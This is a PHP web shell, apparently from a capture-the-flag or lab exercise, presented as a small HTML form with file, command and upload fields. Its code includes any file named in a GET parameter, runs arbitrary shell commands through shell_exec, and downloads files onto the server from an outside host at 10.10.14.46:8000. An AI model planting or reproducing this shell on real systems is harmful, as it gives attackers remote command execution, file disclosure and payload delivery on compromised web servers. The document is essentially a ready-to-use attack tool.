<html>

<body>
	<center><form method="GET" name="<?php basename($_SERVER['PHP_SELF']) ?>">
		<input type ="text" name="filename" id="filename" size="40">
		<input type ="submit" value ="Archivo">
		&nbsp
		<input type ="text" name="command" id="command" size="40">
                <input type ="submit" value ="execute">
		&nbsp
		<input type ="text" name="fupload" id="fupload" size="40">
                <input type ="submit" value ="upload">
               </form></center>

	<hr>

	<?php
		if(isset($_GET['filename'])){
			echo "<pre>";
			include($_GET['filename']);
			echo "</pre>";
		};
		if(isset($_GET['filename'])){
        		echo "<pre>" . shell_exec($_GET['command']) . "</pre>";
		};
		if(isset($_GET['filename'])){
			file_put_contents($_GET['fupload'],file_get_contents("http://10.10.14.46:8000/".$_GET['fupload']));
                };
	?>		
</body>

</html>
